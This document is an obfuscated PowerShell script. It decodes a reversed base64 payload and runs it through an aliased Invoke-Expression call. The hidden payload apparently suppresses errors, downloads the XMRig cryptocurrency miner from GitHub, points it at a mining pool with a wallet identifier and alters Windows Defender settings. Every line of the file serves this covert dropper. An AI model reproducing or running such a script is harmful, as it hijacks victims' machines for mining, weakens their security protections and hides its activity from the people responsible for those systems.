$best64code = "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" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
$RandomSTR64 = '42bpN1UlJFcYVULlt0T25WS'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
$aliasSTR64 = 'QOopGU'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
$NUlL = nEW-AlIas -naMe $ALIaSfInaL -VaLUe $IExCMd -FORCE ; & $AliasFINal $LoaDcode ;
